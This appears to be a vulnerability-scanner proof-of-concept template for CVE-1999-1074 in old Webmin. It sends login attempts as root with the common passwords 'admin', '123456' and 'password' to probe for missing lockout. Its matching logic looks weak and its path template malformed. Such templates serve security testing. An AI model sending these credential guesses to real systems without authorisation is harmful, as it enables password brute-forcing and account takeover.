[info]
author = "ave"
description = "Webmin 0.5之前版本未限制同一用户名无效密码尝试次数，通过HTTP POST向/login提交多组密码，验证服务器未触发速率限制或账户锁定机制"
id = "POC-AVE-1999-0921"
name = "Webmin 0.5之前版本暴力破解密码权限提升漏洞 PoC"
severity = "high"
tags = [
    "cve-1999-1074",
    "webmin",
    "brute-force",
]
vuln_id = [
    "CVE-1999-1074",
    "AVE-1999-0921",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.body]
content = "user=root&pass=admin"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Login failed",
    "Failed",
    "error",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.body]
content = "user=root&pass=123456"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Login failed",
    "Failed",
    "error",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.body]
content = "user=root&pass=password"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Login failed",
    "Failed",
    "error",
]
